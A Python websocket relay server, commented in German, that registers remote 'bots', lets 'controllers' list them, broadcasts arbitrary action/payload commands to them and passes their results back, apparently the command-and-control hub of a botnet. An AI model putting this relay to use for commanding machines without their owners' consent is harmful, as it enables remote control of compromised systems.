import asyncio
import websockets
import json
import time
from colorama import init, Fore, Style

init(autoreset=True)

bots = {}  # verbundene Bots
controllers = []  # verbundene Controller


async def broadcast_to_bots(msg):
    target = msg.get("target", "all")
    targets = list(bots.keys()) if target == "all" else [target] if target in bots else []

    task_id = msg.get("task_id")

    for bot_id in targets:
        try:
            await bots[bot_id]["ws"].send(json.dumps({
                "type": "command",
                "task_id": task_id,
                "data": {
                    "type": msg.get("action"),
                    "payload": msg.get("payload")
                }
            }))
        except:
            pass
    return len(targets)


async def handler(websocket, path=None):
    try:
        first_msg = await websocket.recv()
        data = json.loads(first_msg)

        # === Bot verbindet sich ===
        if data.get("type") == "register":
            bot_id = data["bot_id"]
            hostname = data["info"].get("hostname", "Unknown")
            bots[bot_id] = {
                "ws": websocket,
                "hostname": hostname,
                "last_seen": time.time(),
                "info": data["info"]
            }
            print(f"{Fore.GREEN}✅ Bot verbunden: {bot_id} | {hostname}{Style.RESET_ALL}")

            async for message in websocket:
                msg = json.loads(message)
                if msg["type"] == "result":
                    for ctrl in controllers[:]:
                        try:
                            await ctrl.send(json.dumps(msg))
                        except:
                            if ctrl in controllers:
                                controllers.remove(ctrl)

        # === Controller verbindet sich ===
        elif data.get("type") == "controller":
            controllers.append(websocket)
            print(f"{Fore.MAGENTA}🖥️ Controller verbunden{Style.RESET_ALL}")

            async for message in websocket:
                msg = json.loads(message)
                if msg["type"] == "command":
                    action = msg.get("action")

                    if action == "list":
                        # Sofortige Antwort mit Bot-Liste
                        bot_list = [
                            {
                                "bot_id": bid,
                                "hostname": info["hostname"],
                                "last_seen": int(time.time() - info["last_seen"])
                            }
                            for bid, info in bots.items()
                        ]
                        await websocket.send(json.dumps({
                            "type": "result",
                            "data": {"bots": bot_list, "count": len(bots)}
                        }))
                    else:
                        # Normale Befehle an Bots weiterleiten
                        await broadcast_to_bots(msg)

    except Exception as e:
        print(f"Fehler: {e}")
    finally:
        if websocket in controllers:
            controllers.remove(websocket)
        # Bot Cleanup
        for bid, info in list(bots.items()):
            if info["ws"] == websocket:
                print(f"{Fore.RED}❌ Bot getrennt: {bid}{Style.RESET_ALL}")
                del bots[bid]


async def main():
    async with websockets.serve(handler, "0.0.0.0", 8765):
        print(f"{Fore.GREEN}🚀 VPS Relay Server läuft auf ws://0.0.0.0:8765{Style.RESET_ALL}")
        await asyncio.Future()


if __name__ == "__main__":
    asyncio.run(main())